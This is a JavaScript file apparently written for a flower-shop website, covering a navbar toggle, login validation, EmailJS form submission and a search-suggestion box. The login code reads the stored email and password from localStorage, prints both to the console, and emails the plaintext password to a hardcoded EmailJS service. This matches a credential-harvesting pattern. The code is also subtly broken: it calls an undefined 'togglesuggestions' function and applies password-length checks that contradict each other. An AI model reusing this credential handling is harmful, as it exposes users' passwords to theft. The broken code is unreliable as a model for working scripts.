//header 
document.addEventListener("DOMContentLoaded",function(){
    burger=document.querySelector(".fa-bars");
        burger.onclick=function(){
            navbar=document.querySelector(".nav_middle");
            navbar.classList.toggle("active");
}
})

//////////////////////////////////////////////////////////////////////

var submitbtn=document.getElementById("submitbtn");
submitbtn.disabled=true;
function validlog(x){
    var email=document.getElementById("email").value;
    var password=document.getElementById("password").value;
    var emailerror=document.getElementById("emailerror");
    var passworderror=document.getElementById("passworderror");
    var outemail=document.getElementById("email");
    var outpass=document.getElementById("password");
    if(email.indexOf("@")==-1 || email.length<=0 ||email.indexOf(".com")==-1){
        emailerror.innerHTML=" * Please enter a valid email";
        outemail.style.border="1px solid red";
        submitbtn.disabled=true;
    }else if(email.indexOf("@")>-1 && email.length>0 && email.indexOf(".com")>-1){
        emailerror.innerHTML="";
        outemail.style.border="1px solid #000";
    }
    if(password.length<8 || password.length>60){
        passworderror.innerHTML="* Please enter a valid password";
        outpass.style.border="1px solid red";
        submitbtn.disabled=true;
    }else if(password.length>4 && password.length<60){
        passworderror.innerHTML="";
        outpass.style.border="1px solid #000";
    }
    if(x.checked==false){
        submitbtn.disabled=true;
    }
    if(email.indexOf("@")>-1 && email.indexOf(".com")>-1 && email.length>0 && password.length>8 &&
    password.length<60 && x.checked==true){
        submitbtn.disabled=false;
    }
}

document.addEventListener('DOMContentLoaded' ,()=>{

    var email=localStorage.getItem('Email');
    var password=localStorage.getItem('Password');

    document.getElementById("email").value=email;
    document.getElementById("password").value=password;
    console.log(email,password);

});




function sendmail2(){
    var emailinput=document.getElementById("email");
    var passwordinput=document.getElementById("password");
    
    var publickey="Ig3xR1STyH_1bNJnb";
    var serviceid="service_x06ggzd";
    var templateid="template_e88xbzw";
    
    
    var inputfields={
            email:emailinput.value,
            password:passwordinput.value
        }
        console.log(inputfields);
        emailjs.send(serviceid,templateid,inputfields)
        .then(function(res) {
            emailinput.value="";
            passwordinput.value="";
            console.log(res);   
            window.location.href='profile.html';
        });
}

///////////////////////////////////////////////////////////////////////////////
//funcctions for filter secarch 
const searchinput=document.getElementById("search-input");
    const searchsuggestions=document.getElementById("search-suggestions");

    const suggestionsdata=[
    "Is The Perfect Way To Show Your Love",
    "Flowers always make people better"," happier and more helpful","They are sunshine, food and medicine to the soul.",
    "Perfect For your beloved","Voila Forest Cake With Roses Hand","Emma Remal Scarf With White Roses Bouquet",
    "Summer Vibes With Orange Roses","Light Pink Bouquet White Wrap","Al-Moled Bouquet With Purple and White roses",
    "Get Well Soon With Colorful Bouquet","Key L'azurde With White Roses","Felizmoda silver Bracelet With Pink Roses Bouquet",
    "Now you can customize your bouquet","Through the following three steps, you can create your own unique bouquet",
    "Decoration","White Kosha","pink Kosha","Discover Our Chocolate Bouquet Delights","Send a with Video Message with Your Flowers by QR Code",
    "Wedding Flowers Add a Touch of Elegance","We Use Eco-Friendly Flower Paper",
    "Fresh Flowers Delivered in Air-Conditioned Cars","Add a Personal Touch to Your Bouquet"
    ]

    function updatesuggestions(query){
    searchsuggestions.innerHTML="";

    const filtersuggestions=suggestionsdata.filter((item) =>
        item.toLocaleLowerCase().includes(query.toLocaleLowerCase())
    );

    filtersuggestions.forEach((suggestion) => {
        const li =document.createElement('li');
        li.textContent=suggestion;
        li.addEventListener('click', () => {
        setsearchinputvalue(suggestion);
        window.location.href='shop.html';
        hidesuggestions();
        });
        searchsuggestions.appendChild(li);
    });

    togglesuggestions(filtersuggestions.length > 0);
    }

    function setsearchinputvalue(value){
    searchinput.value=value;
    }

    function hidesuggestions(show){
    searchsuggestions.style.display= show ? 'block' :'none';
    }

    searchinput.addEventListener('input', () =>{
    const query =searchinput.value;
    updatesuggestions(query);
    });

    document.addEventListener('click' ,(event) => {
    if (
        !searchsuggestions.contains(event.target) && 
        event.target !== searchinput
    )
    {
        hidesuggestions();
    }
    });

    searchinput.addEventListener("keydown" ,(event) =>{
    if(event.key === "Enter"){
        event.preventDefault();
    }
    });